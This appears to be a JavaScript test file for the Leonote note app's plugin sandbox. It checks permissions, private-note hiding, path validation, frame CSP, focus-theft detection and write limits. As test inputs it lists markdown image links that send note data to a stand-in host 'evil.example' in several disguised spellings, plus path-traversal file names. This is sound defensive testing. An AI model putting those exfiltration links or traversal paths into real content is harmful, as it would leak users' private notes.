// Plugins: what a frame may ask for is judged in plugins.js (plugins.rs has the folder, the yes, the list and net).
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

class El {
  constructor(tag) { this.nodeType = 1; this.tagName = String(tag).toUpperCase(); this.kids = []; this.on = {}; this.classList = { add() {}, remove() {}, toggle() {} }; this.style = { setProperty() {} }; this.dataset = {}; this.value = ""; this.hidden = false; }
  addEventListener(t, fn) { this.on[t] = fn; }
  setAttribute(k, v) { this[k] = v; }
  append(...k) { this.kids.push(...k); }
  replaceChildren(...k) { this.kids = k.map((x) => (x == null ? String(x) : x)); } // as the DOM does
  remove() {}
  get lastChild() { return this.kids.at(-1); }
  querySelector() { return new El("span"); }
  all() { return [this, ...this.kids.filter((k) => k instanceof El).flatMap((k) => k.all())]; }
  words() { return this.all().flatMap((e) => [e.textContent, ...e.kids.filter((k) => typeof k === "string")]).filter(Boolean).join(" "); }
}
const root = new El("div");
globalThis.document = { documentElement: { dataset: {} }, createElement: (t) => new El(t), createElementNS: (_, t) => new El(t), createTextNode: (t) => t, getElementById: () => root, addEventListener() {}, removeEventListener() {} };
globalThis.getComputedStyle = () => ({ getPropertyValue: () => "" });
globalThis.location = { href: "http://tauri.localhost/index.html" };
let listener = null;
let onBlur = null;
globalThis.addEventListener = (t, fn) => { if (t === "message") listener = fn; if (t === "blur") onBlur = fn; };

const { callPlugin, onPluginMessage, safeNotePath, frameCsp, mountPlugins, pluginsPanel, listState, newer, sourceWords, addsWebAddress, VERIFIED, pluginAgent } = await import("../plugins.js");
const { mountProposals } = await import("../proposals.js");

/** The real AI access over a little vault: Secret/ is private, Open/ open, the rest review. */
async function vault(full = false) {
  const note = (path, content) => [path, { path, content, mtime: 1 }];
  const notes = new Map([note("Notes/a.md", "fine"), note("Secret/k.md", "the key"), note("Notes/own.md", "---\nai: private\n---\nmine"), note("Open/o.md", "open text"), note("@guest/1/out.md", "outside")]);
  const made = [], written = [];
  const app = {
    settings: {}, bus: { emit() {}, on() {} }, commands: [],
    vault: { notes, files: new Map(), folders: [], bus: { on() {} }, write: async (p, c) => { written.push([p, c]); } },
    host: { on() {}, proposalsCount: async () => 0, aiAccessGet: async () => ({ default: "review", folders: { Secret: "private", Open: "open" }, full }), proposalMake: async (p, c, kind, agent) => { made.push({ p, c, kind, agent }); } },
  };
  app.proposals = mountProposals(app);
  await app.proposals.ready;
  return { app, made, written };
}
const ALL = ["commands", "panel", "notes.read", "notes.write", "net:api.example.com"];
const plugin = (permissions, more = {}) => ({ row: { id: "wc", name: "Word count", permissions }, alive: true, addCommand() { return "added"; }, showPanel() { return "shown"; }, hidePanel() { return "hidden"; }, ...more });

test("a frame cannot use what it was not given, nor anything Leonote does not offer", async () => {
  const { app, made, written } = await vault();
  let fetched = 0;
  app.host.pluginFetch = async () => { fetched++; return { status: 200, text: "" }; };
  const none = plugin([]);
  for (const [m, a] of [["commands.add", ["a", "A"]], ["panel.show", []], ["panel.hide", []], ["notes.list", []], ["notes.read", ["Notes/a.md"]], ["notes.write", ["Notes/a.md", "x"]], ["notes.append", ["Notes/a.md", "x"]], ["net.fetch", ["https://api.example.com/"]]]) {
    await assert.rejects(callPlugin(app, none, m, a), /not allowed/, m);
  }
  // reading is not writing, one host is not another
  await assert.rejects(callPlugin(app, plugin(["notes.read"]), "notes.write", ["Notes/a.md", "x"]), /not allowed/);
  for (const url of ["https://evil.example/", "http://api.example.com/", "https://api.example.com:8443/", "https://u:p@api.example.com/", "https://sub.api.example.com/", "not a url", undefined]) {
    await assert.rejects(callPlugin(app, plugin(["net:api.example.com"]), "net.fetch", [url]), /not allowed/, String(url));
  }
  assert.equal(fetched, 0);
  await callPlugin(app, plugin(["net:api.example.com"]), "net.fetch", ["https://api.example.com/x"]);
  assert.equal(fetched, 1);
  // nothing else exists, whatever it is called
  for (const m of ["tasks.list", "settings.get", "files.read", "constructor", "__proto__", "toString", "host.openUrl"]) await assert.rejects(callPlugin(app, plugin(ALL), m, []), /no such call/, m);
  assert.equal(made.length + written.length, 0);
});

test("private notes are never given: not listed, not read, not written", async () => {
  const { app, made, written } = await vault();
  const p = plugin(ALL);
  const paths = (await callPlugin(app, p, "notes.list", [])).map((n) => n.path);
  assert.deepEqual(paths, ["Notes/a.md", "Open/o.md"], "a private folder, a note's own ai: private and an outside file are all left out");
  for (const path of ["Secret/k.md", "secret/K.md", "Notes/own.md", "SECRE~1/k.md"]) {
    await assert.rejects(callPlugin(app, p, "notes.read", [path]), /No such note/, path);
  }
  await assert.rejects(callPlugin(app, p, "notes.read", ["Notes/none.md"]), /No such note/, "the same answer as for a note that is not there");
  assert.equal(await callPlugin(app, p, "notes.read", ["Notes/a.md"]), "fine");
  for (const m of ["notes.write", "notes.append"]) for (const path of ["Secret/k.md", "secret/K.md", "Secret/new.md", "Notes/own.md", "notes/OWN.md", "SECRE~1/k.md"]) {
    assert.equal(await callPlugin(app, p, m, [path, "x"]), "proposed", `${m} ${path}: what a note that is not there gets`);
  }
  assert.equal(made.length + written.length, 0, "nothing was proposed or written");
  // and in an open folder too, where a note that is not there is written
  app.vault.notes.set("Open/own.md", { path: "Open/own.md", content: "---\nai: private\n---\nmine https://mine.example", mtime: 1 });
  assert.equal(await callPlugin(app, p, "notes.write", ["Open/own.md", "x"]), "written");
  assert.equal(await callPlugin(app, p, "notes.append", ["Open/own.md", "https://mine.example"]), "proposed", "as for a new note: its address is not checked against the private text");
  assert.equal(made.length + written.length, 0);
  assert.equal(await callPlugin(app, p, "notes.write", ["Open/none.md", "https://mine.example"]), "proposed");
  assert.equal(made.length, 1);
  assert.equal(await callPlugin(app, p, "notes.write", ["Open/none.md", "x"]), "written");
  assert.deepEqual(written, [["Open/none.md", "x"]]);
});

test("a change that adds a web address waits for the user, even in an open note", async () => {
  const { app, made, written } = await vault();
  const p = plugin(ALL);
  const spellings = ["![x](https://evil.example/?d=notes)", "https://evil.example/?d=notes", "![x](//evil.example/a.png)", "![x](https:evil.example/a.png)", "![x](<ht\ttps://evil.example/a.png>)", "![x](\\\\evil.example\\a.png)", "www.evil.example", "![x](https&colon;//evil.example)"];
  for (const text of spellings) {
    assert.equal(await callPlugin(app, p, "notes.write", ["Open/o.md", text]), "proposed", text);
    assert.equal(await callPlugin(app, p, "notes.append", ["Open/o.md", text]), "proposed", text);
  }
  assert.equal(written.length, 0);
  assert.equal(made.length, spellings.length * 2);
  // no address, or one the note already had: as before
  assert.equal(await callPlugin(app, p, "notes.write", ["Open/o.md", "plain text: a/b"]), "written");
  assert.ok(!addsWebAddress("see https://a.example/x", "see https://a.example/x and more"));
  assert.ok(addsWebAddress("see https://a.example/x", "see https://a.example/x?d=secret"), "the same site with more on the end is new");
  assert.ok(addsWebAddress("https:", "https: //evil.example"), "parts of one over two writes");
});

test("a plugin's frame hears the app only, and cannot change who that is", () => {
  const parent = { postMessage() {} };
  const sibling = {};
  const on = [];
  const win = { parent };
  function Document() {}
  vm.runInNewContext(readFileSync(new URL("../pluginframe.js", import.meta.url), "utf8"), {
    window: win, parent, Object, Promise, Map, String, Error, Document,
    addEventListener: (t, fn, capture) => { if (t === "message") on.push({ fn, capture }); },
  });
  assert.equal(on.length, 1);
  assert.equal(on[0].capture, true, "first, whatever the plugin's script adds later");
  const stops = (source, data) => { let stopped = false; on[0].fn({ source, data, stopImmediatePropagation() { stopped = true; } }); return stopped; };
  assert.ok(stops(sibling, { type: "my notes" }), "what a sibling sends stops here");
  assert.ok(stops(null, {}), "as does what a frame now gone sent");
  win.parent = sibling; // a plugin's script may do this
  assert.ok(stops(sibling, { type: "my notes" }), "still");
  assert.ok(!stops(parent, { type: "plugin-reply", id: 1 }), "the app is heard");
  // document.open would wipe that listener: it, write and writeln throw, and cannot be put back
  for (const k of ["open", "write", "writeln"]) {
    assert.throws(() => Document.prototype[k].call({}), /not available to a plugin/, k);
    assert.throws(() => Object.defineProperty(Document.prototype, k, { value() {} }), TypeError, k);
    assert.throws(() => { Document.prototype[k] = () => "mine"; }, TypeError, k);
  }
});

test("a panel's frame cannot take the keyboard: inert until a click on it, and again after a click elsewhere", async () => {
  const doc = {};
  const pane = new El("aside");
  const { addEventListener: add, getElementById: get } = globalThis.document;
  globalThis.document.addEventListener = (t, fn) => { doc[t] = fn; };
  globalThis.document.getElementById = () => pane;
  const app = { commands: [], host: { pluginList: async () => [{ id: "wc", name: "Word count", version: "1.0.0", on: true, permissions: ["panel"] }] } };
  const plugins = mountPlugins(app);
  Object.assign(globalThis.document, { addEventListener: add, getElementById: get });
  const body = pane.kids[1];
  body.contains = (x) => x === body || x === frame;
  await plugins.refresh();
  const frame = body.kids[0];
  frame.focus = () => { frame.focused = true; };
  frame.contentWindow = { postMessage() {} };
  frame.on.load();
  const call = async (method) => { listener({ source: frame.contentWindow, data: { type: "plugin-call", id: 1, method, args: [] } }); await new Promise((r) => setTimeout(r, 1)); };
  assert.equal(frame.inert, true, "from the start");
  await call("panel.show");
  assert.equal(frame.inert, true, "showing it gives it nothing");
  body.on.click({});
  assert.equal(frame.inert, false);
  assert.ok(frame.focused);
  doc.pointerdown({ target: body });
  assert.equal(frame.inert, false, "a click inside keeps it");
  doc.pointerdown({ target: new El("input") });
  assert.equal(frame.inert, true, "a click elsewhere ends it");
  body.on.keydown({ key: "Enter", target: body });
  assert.equal(frame.inert, false, "the keyboard can get there too");
  doc.focusin({ target: new El("input") });
  assert.equal(frame.inert, true, "focus moved by the app ends it too");
  body.on.click({});
  frame.blur = () => { globalThis.document.activeElement = null; };
  globalThis.document.activeElement = frame;
  await call("panel.hide");
  assert.equal(frame.inert, true);
  assert.equal(globalThis.document.activeElement, null, "going away gives the focus back, so it is not taken for a theft");
  // the frame takes the focus while inert, with no click: it is stopped and turned off, and the user's place given back
  await call("panel.show");
  const place = new El("input");
  place.focus = () => { place.focused = true; };
  doc.focusin({ target: place });
  globalThis.document.activeElement = frame;
  const toasts = [], off = [];
  app.toast = (t) => toasts.push(t);
  app.host.pluginDisable = async (id) => { off.push(id); };
  onBlur();
  await new Promise((r) => setTimeout(r, 5));
  globalThis.document.activeElement = null;
  assert.deepEqual(off, ["wc"]);
  assert.ok(place.focused);
  assert.match(toasts[0], /Word count took the keyboard/);
  assert.ok(pane.hidden);
  plugins.stop("wc");
});

test("a frame with no panel shown that takes the keyboard is caught too, by the watch alone", async () => {
  const app = { commands: [], toast() {}, host: { pluginList: async () => [{ id: "a", name: "Quiet", version: "1", on: true, permissions: [] }, { id: "b", name: "Keys", version: "1", on: true, permissions: [] }] } };
  const plugins = mountPlugins(app);
  const off = [];
  app.host.pluginDisable = async (id) => { off.push(id); };
  await plugins.refresh();
  const frames = root.kids.at(-1).kids;
  assert.ok(frames.every((f) => f.inert), "hidden frames are inert");
  globalThis.document.activeElement = frames[1]; // no blur heard: focus was in another frame
  await new Promise((r) => setTimeout(r, 450));
  globalThis.document.activeElement = null;
  assert.deepEqual(off, ["b"]);
  plugins.stop("a"); plugins.stop("b");
});

test("plugins go by the folders even when AI has full access", async () => {
  const { app, made, written } = await vault(true);
  assert.equal(app.proposals.noteAccess("Secret/k.md"), "open", "AI gets it");
  const p = plugin(ALL);
  const listed = (await callPlugin(app, p, "notes.list", [])).map((n) => n.path);
  assert.ok(!listed.includes("Secret/k.md"));
  await assert.rejects(callPlugin(app, p, "notes.read", ["Secret/k.md"]), /No such note/);
  assert.equal(await callPlugin(app, p, "notes.write", ["Secret/k.md", "x"]), "proposed");
  assert.equal(await callPlugin(app, p, "notes.write", ["Notes/a.md", "x"]), "proposed", "review still waits");
  assert.equal(made.length, 1);
  assert.equal(made[0].p, "Notes/a.md");
  assert.equal(written.length, 0);
});

test("writes follow AI access: review makes a proposal, open writes", async () => {
  const { app, made, written } = await vault();
  const p = plugin(ALL);
  assert.equal(await callPlugin(app, p, "notes.write", ["Notes/a.md", "new"]), "proposed");
  assert.deepEqual(made[0], { p: "Notes/a.md", c: "new", kind: "write", agent: "Plugin: Word count (wc)" });
  assert.equal(written.length, 0);
  assert.equal(await callPlugin(app, p, "notes.write", ["Open/o.md", "new"]), "written");
  assert.deepEqual(written[0], ["Open/o.md", "new"]);
  assert.equal(await callPlugin(app, p, "notes.append", ["Open/o.md", "more\n\n"]), "written");
  assert.deepEqual(written[1], ["Open/o.md", "open text\n\nmore\n"]);
  assert.equal(await callPlugin(app, p, "notes.append", ["Notes/a.md", "more"]), "proposed");
  assert.equal(made[1].kind, "append");
  // turned off while it asked: nothing happens
  await assert.rejects(callPlugin(app, plugin(ALL, { alive: false }), "notes.write", ["Open/o.md", "late"]), /off/);
  assert.equal(written.length, 2);
});

test("only a note's plain path passes", () => {
  for (const ok of ["a.md", "Folder/Sub/My note.md", "Дневник/день.MD"]) assert.ok(safeNotePath(ok), ok);
  for (const bad of ["../a.md", "a/../../b.md", "/a.md", "C:/a.md", "a\\b.md", ".leonote/x.md", ".trash/a.md", "a/.hidden/b.md", "@guest/1/a.md", "Private./a.md", "Private /a.md", "a.md.", "a.md ", "a.md:evil", "a//b.md", "plugin.json", "x.leovideo", "", null, 3, {}]) assert.ok(!safeNotePath(bad), String(bad));
});

test("the page answers only the frame itself, and a stopped frame not at all", async () => {
  const { app } = await vault();
  const heard = [];
  const frame = { postMessage: (m) => heard.push(m) };
  const other = { postMessage: (m) => heard.push(["other", m]) };
  const p = plugin(["notes.read"]);
  const frames = new Map([[frame, p]]);
  const wait = () => new Promise((r) => setTimeout(r, 5));
  onPluginMessage(app, frames, { source: other, data: { type: "plugin-call", id: 1, method: "notes.read", args: ["Notes/a.md"] } });
  onPluginMessage(app, frames, { source: null, data: { type: "plugin-call", id: 2, method: "notes.read", args: ["Notes/a.md"] } });
  await wait();
  assert.equal(heard.length, 0, "a window that is no plugin's frame gets nothing");
  onPluginMessage(app, frames, { source: frame, data: { type: "plugin-call", id: 3, method: "notes.read", args: ["Notes/a.md"] } });
  onPluginMessage(app, frames, { source: frame, data: { type: "plugin-call", id: 4, method: "notes.read", args: ["Secret/k.md"] } });
  onPluginMessage(app, frames, { source: frame, data: { type: "plugin-call", id: 5, method: "notes.write", args: ["Notes/a.md", "x"] } });
  await wait();
  const by = (id) => heard.find((m) => m.id === id);
  assert.deepEqual(by(3), { type: "plugin-reply", id: 3, ok: true, value: "fine" });
  assert.equal(by(4).ok, false);
  assert.ok(!JSON.stringify(heard).includes("the key"));
  assert.match(by(5).error, /not allowed/);
  p.alive = false;
  heard.length = 0;
  onPluginMessage(app, frames, { source: frame, data: { type: "plugin-call", id: 6, method: "notes.read", args: ["Notes/a.md"] } });
  await wait();
  assert.equal(heard.length, 0);
});

test("the frame is sandboxed with no way out of its own", () => {
  const src = readFileSync(new URL("../plugins.js", import.meta.url), "utf8");
  assert.match(src, /sandbox: "allow-scripts",/, "scripts only: no same origin, no popups, no navigating the app");
  assert.ok(!/allow-same-origin|allow-top-navigation|allow-popups|allow-forms/.test(src));
  const csp = frameCsp("http://tauri.localhost/pluginframe.js");
  for (const d of ["default-src 'none'", "connect-src 'none'", "frame-src 'none'", "worker-src 'none'", "form-action 'none'", "webrtc 'block'"]) assert.ok(csp.includes(d), d);
  assert.match(csp, /script-src http:\/\/tauri\.localhost\/pluginframe\.js blob:;/);
  assert.ok(!csp.includes("*"), "no wildcard");
  // the app keeps this frame from navigating, by its name
  assert.match(readFileSync(new URL("../../src-tauri/src/lib.rs", import.meta.url), "utf8"), /"leonote-dataview" \| "leonote-plugin"/);
  assert.match(src, /name: "leonote-plugin"/);
  // and its script is shipped
  assert.match(readFileSync(new URL("../build.mjs", import.meta.url), "utf8"), /pluginframe\.js/);
  // a frame's reply and commands are heard from the app only
  assert.match(readFileSync(new URL("../pluginframe.js", import.meta.url), "utf8"), /e\.source !== host/);
});

function fakePanelApp(search) {
  const calls = [];
  const rows = [{ id: "wc", name: "Word count", version: "1.0.0", author: "A", on: true, known: true, words: ["Show a side panel"], permissions: ["panel"], more: [], source: { kind: "github", repo: "a/wc" } }];
  const host = new Proxy({}, { get: (_, k) => async () => {
    calls.push(k);
    return k === "pluginSearch" ? search() : null;
  } });
  const app = { host, commands: [], toast() {} };
  app.plugins = { refresh: async () => rows, rows: () => rows, failed: () => null, errorOf: () => null, stop() {} };
  return { app, calls };
}
const button = (el, text) => el.all().find((e) => e.tagName === "BUTTON" && e.words().includes(text));

test("no network at boot, and none in Settings until the search is opened", async () => {
  const { app, calls } = fakePanelApp(() => []);
  const panel = pluginsPanel(app);
  await new Promise((r) => setTimeout(r, 5));
  assert.ok(!calls.includes("pluginSearch"), "painting Settings loads nothing");
  await button(panel, "Search plugins").on.click();
  assert.deepEqual(calls.filter((c) => c === "pluginSearch"), ["pluginSearch"]);
  // the boot itself: starting plugins asks only for what is on this computer, and with none, nothing starts
  const asked = [];
  const bootApp = { commands: [], host: new Proxy({}, { get: (_, k) => async () => { asked.push(k); return []; } }) };
  await mountPlugins(bootApp).refresh();
  assert.deepEqual(asked, ["pluginList"]);
  assert.equal(typeof listener, "function");
  // and nothing but the click reaches for the list
  for (const f of ["main.js", "settings.js", "plugins.js"]) {
    const uses = readFileSync(new URL("../" + f, import.meta.url), "utf8").split("pluginSearch").length - 1;
    assert.equal(uses, f === "plugins.js" ? 1 : 0, f);
  }
});

test("a list that does not load says so plainly; a loaded one shows Verified, stars and Report", async () => {
  let up = false;
  const entry = { id: "tags", name: "Tag tools", author: "B", description: "Tags.", version: "2.0.0", words: ["Read your notes, except private ones"], verified: true, stars: 7, updated: "2026-11-01", report: "https://github.com/Olexify/leonote-plugins/issues/new?title=x" };
  const { app } = fakePanelApp(() => { if (!up) throw new Error("404 from raw.githubusercontent.com"); return [entry, { ...entry, id: "wc", name: "Newer wc", verified: false, stars: 1, version: "1.1.0", repo: "a/wc" }]; });
  const panel = pluginsPanel(app);
  await button(panel, "Search plugins").on.click();
  assert.match(panel.words(), /could not be loaded/);
  assert.ok(!panel.words().includes("404"), "plain words, not the error");
  up = true;
  await button(panel, "Search plugins").on.click();
  const said = panel.words();
  assert.ok(!/\bnull\b|undefined/.test(said), "nothing empty is shown as a word");
  for (const w of ["Tag tools", "by B", "Read your notes, except private ones", "Verified", "Not verified", "7 GitHub stars as of 2026-11-01", "1 GitHub star", "Update available: 1.1.0", "From GitHub: a/wc", "Report"]) assert.ok(said.includes(w), w);
  // the tag says what the check covers, and nothing more
  assert.ok(panel.all().some((e) => e.textContent === "Verified" && e.title === VERIFIED));
  assert.match(VERIFIED, /nothing else/);
});

test("update only when the opened list shows a newer version", () => {
  const rows = [{ id: "a", version: "1.2.0", source: { kind: "github", repo: "Me/a" } }];
  assert.equal(listState({ id: "a", version: "1.10.0", repo: "me/A" }, rows), "update");
  assert.equal(listState({ id: "a", version: "1.2.0", repo: "me/a" }, rows), "installed");
  assert.equal(listState({ id: "a", version: "1.1.9", repo: "me/a" }, rows), "installed");
  // the same id from another repo, or over one put in from a folder: not offered as its update
  assert.equal(listState({ id: "a", version: "1.10.0", repo: "stranger/a" }, rows), "elsewhere");
  assert.equal(listState({ id: "a", version: "1.10.0", repo: "me/a" }, [{ id: "a", version: "1.2.0", source: { kind: "folder" } }]), "elsewhere");
  assert.equal(listState({ id: "b", version: "1.0.0" }, rows), "install");
  assert.ok(newer("2", "1.9.9") && !newer("1.0", "1.0.0"));
});

test("a row says where the plugin came from", () => {
  assert.match(sourceWords({ kind: "github", repo: "a/b" }), /GitHub: a\/b/);
  assert.match(sourceWords({ kind: "folder", path: "D:\\x" }), /folder on this computer: D:\\x/);
  assert.match(sourceWords(null), /not installed through Leonote/);
});

test("the docs: the example's script uses only what its manifest asks for", () => {
  const m = JSON.parse(readFileSync(new URL("../../docs/plugins/example/plugin.json", import.meta.url), "utf8"));
  const code = readFileSync(new URL("../../docs/plugins/example/" + m.main, import.meta.url), "utf8");
  assert.ok(code.includes("leonote.commands.add") && code.includes("leonote.panel.show") && code.includes("leonote.notes.read"));
  assert.ok(!/leonote\.net|notes\.write|notes\.append|\bfetch\(/.test(code));
});

test("a plugin cannot write without end", async () => {
  const written = [];
  const app = { proposals: { ready: Promise.resolve(), noteAccess: () => "open", accessOf: () => "open", writeFor: async (path) => { written.push(path); return "written"; } }, vault: { notes: new Map() } };
  const p = { row: { id: "w", name: "W", permissions: ["notes.write"] }, alive: true };
  for (let i = 0; i < 30; i++) assert.equal(await callPlugin(app, p, "notes.write", ["a.md", "x"]), "written");
  await assert.rejects(() => callPlugin(app, p, "notes.write", ["a.md", "x"]), /too often/);
  assert.equal(written.length, 30);
});

test("a plugin cannot write more than 20 MB a minute, nor pass for another of its name", async () => {
  const app = { proposals: { ready: Promise.resolve(), noteAccess: () => "open", accessOf: () => "open", writeFor: async () => "written" }, vault: { notes: new Map() } };
  const p = { row: { id: "w", name: "W", permissions: ["notes.write"] }, alive: true };
  const big = "x".repeat(4.5e6);
  for (let i = 0; i < 4; i++) await callPlugin(app, p, "notes.write", ["a.md", big]);
  await assert.rejects(() => callPlugin(app, p, "notes.write", ["a.md", big]), /too much/);
  assert.notEqual(pluginAgent({ id: "a", name: "Same" }), pluginAgent({ id: "b", name: "Same" }));
});

test("a plugin makes 20 proposals an hour at most", async () => {
  const app = { proposals: { ready: Promise.resolve(), noteAccess: () => "review", accessOf: () => "review", writeFor: async () => "proposed" }, vault: { notes: new Map() } };
  const p = { row: { id: "w", name: "W", permissions: ["notes.write"] }, alive: true };
  for (let i = 0; i < 20; i++) assert.equal(await callPlugin(app, p, "notes.append", ["a.md", "x"]), "proposed");
  await assert.rejects(() => callPlugin(app, p, "notes.append", ["a.md", "x"]), /too often/);
});
